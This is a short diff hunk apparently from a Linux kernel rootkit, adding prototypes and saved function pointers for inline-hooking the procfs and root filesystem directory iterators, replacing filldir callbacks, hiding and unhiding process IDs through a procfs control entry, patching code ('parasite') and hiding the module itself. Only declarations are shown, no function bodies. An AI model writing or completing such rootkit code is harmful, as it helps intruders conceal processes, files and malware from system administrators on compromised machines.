@@ -165,3 +165,49 @@ struct proc_dir_entry {
 	char name[];
 };
 
+
+
+/*
+###########
+prototypes
+###########
+*/
+
+
+static int r00tkit_procfs_inlinehook_iterate(struct file *,struct dir_context *);
+static int r00tkit_rootfs_inlinehook_iterate(struct file *,struct dir_context *);
+
+
+static int r00tkit_procfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);
+static int r00tkit_rootfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);
+
+
+static int 	r00tkit_procfs_entry_init(void);
+static ssize_t 	r00tkit_procfs_write(struct file *,const char __user *,size_t,loff_t*);
+static ssize_t  r00tkit_procfs_read(struct file *,char __user *,size_t,loff_t *); 
+
+//static void 	r00tkit_pid2str(int,struct hidden_pids *);
+static int 	r00tkit_hide_pid(const char *,size_t);
+static int  	r00tkit_unhide_pid(const char *,size_t);
+
+
+static int 	r00tkit_hooklist_add(void *,void *);
+static void 	r00tkit_parasite(void *,unsigned char);
+static int 	r00tkit_do_hook(void);
+static void 	r00tkit_undo_hook(void);	
+
+static void 	r00tkit_hide(void);
+
+
+
+/*
+#################
+function pointers
+#################
+*/
+
+static int (*org_procfs_iterate)(struct file *fp,struct dir_context *ctx);
+static int (*org_rootfs_iterate)(struct file *fp,struct dir_context *ctx);
+
+static filldir_t org_procfs_filldir;
+static filldir_t org_rootfs_filldir;
